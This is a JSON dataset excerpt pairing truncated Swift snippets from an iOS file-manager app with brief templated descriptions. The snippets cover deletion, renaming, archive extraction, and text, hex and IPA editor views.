    "code": "func deleteFile(at index: Int) {\n// Get the file based on whether we're in search mode or not\nlet file = searchController.isActive ? filteredFileList[index] : fileList[index]\n// File URL will be accessed via file.url when needed\n\n// Confirm deletion to prevent accidental data loss\nlet fileType = file.isDirectory ? \"folder\" : \"file\"\nlet message = \"Are you sure you want to delete this \\(fileType)?\\n\\nName: \\(file.name)\\n\\(file.formattedSize())\"\n\nlet alert = UIAlertController(",
    "nl": "/ Deletes a file at the specified index / - Parameter index: The index of the file to delete",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2484",
    "code": "private func performFileDeletion(file: File, at index: Int) {\nactivityIndicator.startAnimating()\n\nDebug.shared.log(message: \"Deleting file: \\(file.url.path)\", type: .info)\n\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "/ Performs the actual deletion operation after confirmation / - Parameters: /   - file: The file to delete /   - index: The index of the file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2485",
    "code": "private func updateUIAfterDeletion(file: File, index: Int) {\n// Update the appropriate file list\nif searchController.isActive {",
    "nl": "/ Updates the UI after a file has been deleted / - Parameters: /   - file: The file that was deleted /   - index: The index of the file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2486",
    "code": "func sortFiles() {\nswitch sortOrder {",
    "nl": "Function sortFiles - implements sortfiles functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2487",
    "code": "@objc func showMenu() {\nlet alertController = UIAlertController(title: \"Sort By\", message: nil, preferredStyle: .actionSheet)\n\nlet sortByNameAction = UIAlertAction(title: \"Name\", style: .default) { [weak self] _ in",
    "nl": "MARK: - UI Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2488",
    "code": "func updateSearchResults(for searchController: UISearchController) {\nguard let searchText = searchController.searchBar.text?.lowercased() else { return }",
    "nl": "Function updateSearchResults - updates searchresults",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2489",
    "code": "func showFileOptions(for file: File) {\nlet alertController = UIAlertController(title: \"File Options\", message: file.name, preferredStyle: .actionSheet)\n\n// Different options based on whether it's a directory or file\nif file.isDirectory {",
    "nl": "addDirectory is now implemented above with proper memory management using [weak self]",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2490",
    "code": "private func createNewFile(in directory: File? = nil) {\nlet alertController = UIAlertController(\ntitle: \"Create New File\",\nmessage: \"Enter a name for the new file\",\npreferredStyle: .alert\n)\n\nalertController.addTextField { textField in",
    "nl": "Function createNewFile - creates newfile",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2491",
    "code": "private func createNewFolder(in directory: File? = nil) {\nlet alertController = UIAlertController(\ntitle: \"Create New Folder\",\nmessage: \"Enter a name for the new folder\",\npreferredStyle: .alert\n)\n\nalertController.addTextField { textField in",
    "nl": "Function createNewFolder - creates newfolder",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2492",
    "code": "func renameFile(_ file: File) {\nlet alertController = UIAlertController(\ntitle: \"Rename \\(file.isDirectory ? \"Folder\" : \"File\")\",\nmessage: \"Enter a new name\",\npreferredStyle: .alert\n)\n\nalertController.addTextField { textField in",
    "nl": "Function renameFile - implements renamefile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2493",
    "code": "func openFile(_ file: File) {\n// Show loading indicator while preparing\nactivityIndicator.startAnimating()\n\n// First check if file exists\nguard fileManager.fileExists(atPath: file.url.path) else {",
    "nl": "Function openFile - implements openfile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2494",
    "code": "private func openDirectory(_ directory: File) {\nDebug.shared.log(message: \"Opening directory: \\(directory.url.path)\", type: .info)\n\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "Function openDirectory - implements opendirectory functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2495",
    "code": "private func presentArchiveOptions(for file: File) {\nlet alert = UIAlertController(\ntitle: \"Archive Options\",\nmessage: \"What would you like to do with \\(file.name)?\",\npreferredStyle: .actionSheet\n)\n\nlet extractAction = UIAlertAction(title: \"Extract\", style: .default) { [weak self] _ in",
    "nl": "Function presentArchiveOptions - implements presentarchiveoptions functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2496",
    "code": "private func _presentImagePreview(for file: File) {\n// For this implementation, we'll just show a simple alert that this feature is coming soon\n// In a full implementation, we would display the image in a proper image viewer\nlet alert = UIAlertController(\ntitle: \"Image Preview\",\nmessage: \"Image preview functionality will be available in a future update. Would you like to view this file as hex data?\",\npreferredStyle: .alert\n)\n\nlet viewHexAction = UIAlertAction(title: \"View as Hex\", style: .default) { [weak self] _ in",
    "nl": "Function _presentImagePreview - implements  presentimagepreview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2497",
    "code": "func extractArchive(_ file: File) {\n// Show activity indicator\nactivityIndicator.startAnimating()\n\n// Get destination directory name (remove extension from file name)\nlet baseName = file.name.components(separatedBy: \".\").dropLast().joined(separator: \".\")\nlet destinationName = baseName.isEmpty ? \"Extracted_\\(Int(Date().timeIntervalSince1970))\" : baseName\nlet destinationURL = documentsDirectory.appendingPathComponent(destinationName)\n\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "Function extractArchive - implements extractarchive functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2498",
    "code": "func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {\nreturn searchController.isActive ? filteredFileList.count : fileList.count\n}\n\nfunc tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "MARK: - UITableViewDataSource",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2499",
    "code": "func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nguard let cell = tableView\n.dequeueReusableCell(withIdentifier: \"FileCell\", for: indexPath) as? FileTableViewCell\nelse {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2500",
    "code": "func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\nlet file = searchController.isActive ? filteredFileList[indexPath.row] : fileList[indexPath.row]\n// Instead of showing options, directly open the file for a more intuitive experience\nopenFile(file)\ntableView.deselectRow(at: indexPath, animated: true)\n}\n\nfunc tableView(_: UITableView,\ntrailingSwipeActionsConfigurationForRowAt indexPath: IndexPath) -> UISwipeActionsConfiguration?\n{",
    "nl": "MARK: - UITableViewDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2501",
    "code": "func tableView(_: UITableView,\ntrailingSwipeActionsConfigurationForRowAt indexPath: IndexPath) -> UISwipeActionsConfiguration?\n{",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2502",
    "code": "func documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {\n// Handle potentially multiple selected files\nguard !urls.isEmpty else {",
    "nl": "MARK: - UIDocumentPickerDelegate Implementation for UIDocumentPickerDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2503",
    "code": "func documentPickerWasCancelled(_: UIDocumentPickerViewController) {\nDebug.shared.log(message: \"Document picker was cancelled\", type: .info)\n// Stop any loading indicators that might be active\nactivityIndicator.stopAnimating()\n}\n\n// MARK: - Private Methods\n\nprivate func applyFuturisticTransition() {",
    "nl": "Function documentPickerWasCancelled - implements documentpickerwascancelled functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2504",
    "code": "private func applyFuturisticTransition() {\nlet transition = CATransition()\ntransition.duration = 0.5\ntransition.type = .push\ntransition.subtype = .fromTop\ntransition.timingFunction = CAMediaTimingFunction(name: .easeOut)\nview.layer.add(transition, forKey: nil)\n}\n}\n",
    "nl": "MARK: - Private Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2505",
    "code": "extension CALayer {\n// This method is now defined in HomeViewExtras.swift\n// to avoid duplicate definitions\n}\n",
    "nl": "extension CALayer - implements functionality related to c a layer",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2506",
    "code": "class BaseEditorViewController: UIViewController, UITextViewDelegate {\n/// The URL of the file being edited\nlet fileURL: URL\n\n/// The main text view for editing content\nlet textView: UITextView\n\n/// The toolbar with editing actions\nlet toolbar: UIToolbar\n",
    "nl": "class BaseEditorViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2507",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupUI()\nloadFileContent()\nstartAutoSaveTimer()\n}\n\noverride func viewWillDisappear(_ animated: Bool) {",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2508",
    "code": "override func viewWillDisappear(_ animated: Bool) {\nsuper.viewWillDisappear(animated)\nstopAutoSaveTimer()\nif hasUnsavedChanges {",
    "nl": "Function viewWillDisappear - implements viewwilldisappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2509",
    "code": "func setupUI() {\nview.backgroundColor = UIColor.systemBackground.withAlphaComponent(0.95)\nview.layer.applyFuturisticShadow()\n\nsetupTextView()\nsetupToolbar()\nsetupConstraints()\nsetupAccessibility()\n}\n",
    "nl": "MARK: - Setup / Sets up the user interface",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2510",
    "code": "private func setupTextView() {\ntextView.translatesAutoresizingMaskIntoConstraints = false\ntextView.font = .monospacedSystemFont(ofSize: 14, weight: .regular)\ntextView.delegate = self\ntextView.layer.cornerRadius = 10\ntextView.layer.borderColor = UIColor.systemCyan.withAlphaComponent(0.2).cgColor\ntextView.layer.borderWidth = 1\nview.addSubview(textView)\n}\n",
    "nl": "/ Sets up the text view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2511",
    "code": "private func setupToolbar() {\ntoolbar.translatesAutoresizingMaskIntoConstraints = false\n\nlet saveButton = UIBarButtonItem(barButtonSystemItem: .save, target: self, action: #selector(saveChanges))\nlet copyButton = UIBarButtonItem(barButtonSystemItem: .action, target: self, action: #selector(copyContent))\nlet findReplaceButton = UIBarButtonItem(\ntitle: \"Find/Replace\",\nstyle: .plain,\ntarget: self,\naction: #selector(promptFindReplace)",
    "nl": "/ Sets up the toolbar and its items",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2512",
    "code": "private func setupConstraints() {\nNSLayoutConstraint.activate([\ntextView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 10),\ntextView.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor, constant: 10),\ntextView.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor, constant: -10),\ntextView.bottomAnchor.constraint(equalTo: toolbar.topAnchor, constant: -10),\n\ntoolbar.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor, constant: 10),\ntoolbar.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor, constant: -10),\ntoolbar.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -10),",
    "nl": "/ Sets up layout constraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2513",
    "code": "private func setupAccessibility() {\ntextView.isAccessibilityElement = true\ntextView.accessibilityLabel = \"File Editor\"\n\ntoolbar.isAccessibilityElement = true\ntoolbar.accessibilityLabel = \"Editor Toolbar\"\n}\n\n// MARK: - File Operations\n",
    "nl": "/ Sets up accessibility labels",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2514",
    "code": "func loadFileContent() {\n// Check file size before loading\ndo {",
    "nl": "MARK: - File Operations / Loads file content into the text view / Subclasses should override this method to provide specific loading behavior",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2515",
    "code": "private func loadTextFile() {\nlet activityIndicator = UIActivityIndicatorView(style: .large)\nactivityIndicator.center = view.center\nactivityIndicator.startAnimating()\nview.addSubview(activityIndicator)\n\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "/ Loads a text file into the text view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2516",
    "code": "@objc func saveChanges() {\nguard let text = textView.text else { return }",
    "nl": "/ Saves changes to the file / Subclasses should override this method to provide specific saving behavior",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2517",
    "code": "@objc func copyContent() {\nUIPasteboard.general.string = textView.text\nHapticFeedbackGenerator.generateNotificationFeedback(type: .success)\npresentAlert(title: \"Copied\", message: \"Content copied to clipboard.\")\n}\n\n/// Prompts for find and replace\n@objc func promptFindReplace() {",
    "nl": "MARK: - Editor Actions / Copies the content to the clipboard",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2518",
    "code": "@objc func promptFindReplace() {\nlet alert = UIAlertController(title: \"Find and Replace\", message: nil, preferredStyle: .alert)\n\nalert.addTextField { textField in",
    "nl": "/ Prompts for find and replace",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2519",
    "code": "func findAndReplace(findText: String, replaceText: String) {\nguard !findText.isEmpty, let text = textView.text else { return }",
    "nl": "/ Performs find and replace operation / - Parameters: /   - findText: Text to find /   - replaceText: Text to replace with",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2520",
    "code": "@objc func undoAction() {\ntextView.undoManager?.undo()\n}\n\n/// Performs redo operation\n@objc func redoAction() {",
    "nl": "/ Performs undo operation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2521",
    "code": "@objc func redoAction() {\ntextView.undoManager?.redo()\n}\n\n// MARK: - Timer Management\n\n/// Starts the auto-save timer\nfunc startAutoSaveTimer() {",
    "nl": "/ Performs redo operation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2522",
    "code": "func startAutoSaveTimer() {\nautoSaveTimer = Timer.scheduledTimer(\ntimeInterval: 60.0,\ntarget: self,\nselector: #selector(autoSave),\nuserInfo: nil,\nrepeats: true\n)\n}\n",
    "nl": "MARK: - Timer Management / Starts the auto-save timer",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2523",
    "code": "func stopAutoSaveTimer() {\nautoSaveTimer?.invalidate()\nautoSaveTimer = nil\n}\n\n/// Auto-saves changes\n@objc func autoSave() {",
    "nl": "/ Stops the auto-save timer",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2524",
    "code": "@objc func autoSave() {\nif hasUnsavedChanges {",
    "nl": "/ Auto-saves changes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2525",
    "code": "func promptSaveChanges() {\nlet alert = UIAlertController(\ntitle: \"Unsaved Changes\",\nmessage: \"Save changes before leaving?\",\npreferredStyle: .alert\n)\n\nlet saveAction = UIAlertAction(title: \"Save\", style: .default) { [weak self] _ in",
    "nl": "MARK: - Alerts / Prompts to save changes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2526",
    "code": "func presentAlert(title: String, message: String) {\nlet alert = UIAlertController(\ntitle: title,\nmessage: message,\npreferredStyle: .alert\n)\n\nlet okAction = UIAlertAction(title: \"OK\", style: .default)\nalert.addAction(okAction)\n",
    "nl": "/ Presents an alert with a title and message / - Parameters: /   - title: Alert title /   - message: Alert message",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2527",
    "code": "func textViewDidChange(_: UITextView) {\nhasUnsavedChanges = true\n}\n}\n",
    "nl": "MARK: - UITextViewDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2528",
    "code": "class HexEditorViewController: BaseEditorViewController {\n/// Maximum size in bytes for display in the editor (1MB)\nprivate let maxDisplaySize: UInt64 = 1_000_000\n\noverride func viewDidLoad() {",
    "nl": "/ Editor for binary files in hexadecimal format",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2529",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\n// Set specific accessibility label for hex editor\ntextView.accessibilityLabel = \"Hex Editor\"\n\n// Configure text view for hex editing\ntextView.autocorrectionType = .no\ntextView.autocapitalizationType = .none\ntextView.smartDashesType = .no",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2530",
    "code": "override func loadFileContent() {\n// Check file size before loading to avoid performance issues with large files\ndo {",
    "nl": "Function loadFileContent - implements loadfilecontent functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2531",
    "code": "override func saveChanges() {\nguard let text = textView.text else { return }",
    "nl": "Function saveChanges - implements savechanges functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2532",
    "code": "private func loadHexContent(maxSize: UInt64) {\nlet activityIndicator = UIActivityIndicatorView(style: .large)\nactivityIndicator.center = view.center\nactivityIndicator.startAnimating()\nview.addSubview(activityIndicator)\n\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "/ Loads binary content as hex string / - Parameter maxSize: Maximum number of bytes to load",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2533",
    "code": "@objc private func toggleViewMode() {\nguard let hexText = textView.text else { return }",
    "nl": "/ Toggle between hex and ASCII view modes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2534",
    "code": "@objc private func showFileInfo() {\ndo {",
    "nl": "/ Display file information",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2535",
    "code": "override func findAndReplace(findText: String, replaceText: String) {\nguard !findText.isEmpty, let text = textView.text else { return }",
    "nl": "Override find and replace to handle hex values correctly",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2536",
    "code": "class IPAEditorViewController: UIViewController, UITableViewDelegate, UITableViewDataSource {\n// MARK: - Properties\n\n/// The URL of the IPA file being examined\nprivate let fileURL: URL\n\n/// Table view for displaying extracted contents\nprivate let tableView: UITableView\n\n/// Toolbar for actions",
    "nl": "class IPAEditorViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2537",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupUI()\nextractIPAContents()\n}\n\noverride func viewWillDisappear(_ animated: Bool) {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2538",
    "code": "override func viewWillDisappear(_ animated: Bool) {\nsuper.viewWillDisappear(animated)\ncleanupTempDirectory()\n}\n\ndeinit {",
    "nl": "Function viewWillDisappear - implements viewwilldisappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2539",
    "code": "private func setupUI() {\nview.backgroundColor = UIColor.systemBackground.withAlphaComponent(0.95)\nview.layer.applyFuturisticShadow()\n\nsetupTableView()\nsetupToolbar()\nsetupActivityIndicator()\nsetupConstraints()\n}\n",
    "nl": "MARK: - UI Setup / Sets up the user interface",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2540",
    "code": "private func setupTableView() {\ntableView.translatesAutoresizingMaskIntoConstraints = false\ntableView.delegate = self\ntableView.dataSource = self\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: \"Cell\")\ntableView.layer.cornerRadius = 10\ntableView.layer.borderColor = UIColor.systemCyan.withAlphaComponent(0.2).cgColor\ntableView.layer.borderWidth = 1\nview.addSubview(tableView)\n",
    "nl": "/ Sets up the table view",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2541",
    "code": "private func setupToolbar() {\ntoolbar.translatesAutoresizingMaskIntoConstraints = false\n\nlet backButton = UIBarButtonItem(\nimage: UIImage(systemName: \"chevron.backward\"),\nstyle: .plain,\ntarget: self,\naction: #selector(navigateBack)\n)\nbackButton.isEnabled = false",
    "nl": "/ Sets up the toolbar",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2542",
    "code": "private func setupActivityIndicator() {\nactivityIndicator.translatesAutoresizingMaskIntoConstraints = false\nactivityIndicator.hidesWhenStopped = true\nactivityIndicator.color = .systemCyan\nview.addSubview(activityIndicator)\n}\n\n/// Sets up layout constraints\nprivate func setupConstraints() {",
    "nl": "/ Sets up the activity indicator",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2543",
    "code": "private func setupConstraints() {\nNSLayoutConstraint.activate([\ntableView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 10),\ntableView.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor, constant: 10),\ntableView.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor, constant: -10),\ntableView.bottomAnchor.constraint(equalTo: toolbar.topAnchor, constant: -10),\n\ntoolbar.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor, constant: 10),\ntoolbar.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor, constant: -10),\ntoolbar.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -10),",
    "nl": "/ Sets up layout constraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2544",
    "code": "private func extractIPAContents() {\nactivityIndicator.startAnimating()\n\n// Create a unique temporary directory\nlet newTempDirectory = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)\ntempDirectory = newTempDirectory\n\nDispatchQueue.global(qos: .userInitiated).async { [weak self] in",
    "nl": "MARK: - IPA Processing / Extract the contents of the IPA file",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2545",
